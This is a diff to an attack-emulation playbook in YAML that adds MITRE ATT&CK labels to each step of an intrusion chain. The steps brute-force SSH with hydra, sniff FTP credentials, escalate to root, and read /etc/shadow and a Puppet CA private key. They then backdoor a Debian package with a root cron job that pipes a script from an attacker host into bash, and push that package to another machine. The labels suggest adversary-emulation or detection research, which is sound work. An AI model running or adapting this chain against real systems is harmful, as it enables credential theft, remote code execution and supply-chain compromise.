@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 3 c
 #
 ####################
 vars:
@@ -12,6 +12,9 @@ vars:
 commands:
   - type: shell
     cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+    metadata:
+      techniques: "T1078,T1110,T1133"
+      tactics: "Initial Access"
 
   - type: ssh
     creates_session: foothold
@@ -20,11 +23,17 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078"
+      tactics: "Initial Access"
 
   - type: ssh
     session: foothold
     cmd: "tcpdump -A port 21\n"
     interactive: True
+    metadata:
+      techniques: "T1040"
+      tactics: "Credential Access"
 
   - type: sleep
     seconds: 20
@@ -39,11 +48,17 @@ commands:
     session: foothold
     cmd: "sudo -i\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     session: foothold
@@ -54,16 +69,25 @@ commands:
     session: foothold
     cmd: "cat /etc/shadow\n"
     interactive: True
+    metadata:
+      techniques: "T1003"
+      tactics: "Credential Access"
 
   - type: ssh
     session: foothold
     cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
     interactive: True
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
 
   - type: ssh
     session: foothold
     cmd: "cat /media/share/healthcheck_cron.sh\n"
     interactive: True
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
 
   - type: mktemp
     cmd: file
@@ -101,11 +125,17 @@ commands:
     session: foothold
     cmd: "ls -l /var/www/html/debian\n"
     interactive: True
+    metadata:
+      techniques: "T1083"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: "apt update && apt install -y dpkg-dev\n"
     session: foothold
     interactive: True
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
 
   - type: sleep
     seconds: 20
@@ -114,6 +144,9 @@ commands:
     session: foothold
     cmd: "mkdir /tmp/.tmux_data\n"
     interactive: True
+    metadata:
+      techniques: "T1036"
+      tactics: "Defense Evasion"
 
   - type: ssh
     session: foothold
@@ -124,6 +157,9 @@ commands:
     session: foothold
     cmd: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n"
     interactive: True
+    metadata:
+      techniques: "T1543"
+      tactics: "Persistence"
 
   - type: ssh
     session: foothold
@@ -134,6 +170,9 @@ commands:
     session: foothold
     cmd: "vim DEBIAN/control\n"
     interactive: True
+    metadata:
+      techniques: "T1059"
+      tactics: "Execution"
 
   - type: ssh
     session: foothold
@@ -149,6 +188,9 @@ commands:
     session: foothold
     cmd: "vim DEBIAN/postinst\n"
     interactive: True
+    metadata:
+      techniques: "T1547"
+      tactics: "Persistence"
 
   - type: ssh
     session: foothold
@@ -164,6 +206,9 @@ commands:
     session: foothold
     cmd: "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
     interactive: True
+    metadata:
+        techniques: "T1053,T1105"
+        tactics: "Persistence,Command and Control"
 
   - type: ssh
     session: foothold
@@ -185,6 +230,9 @@ commands:
     session: foothold
     cmd: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n"
     interactive: True
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
 
   - type: ssh
     session: foothold
@@ -200,6 +248,9 @@ commands:
     session: foothold
     cmd: "dpkg-scanpackages . | gzip -c9  > Packages.gz\n"
     interactive: True
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
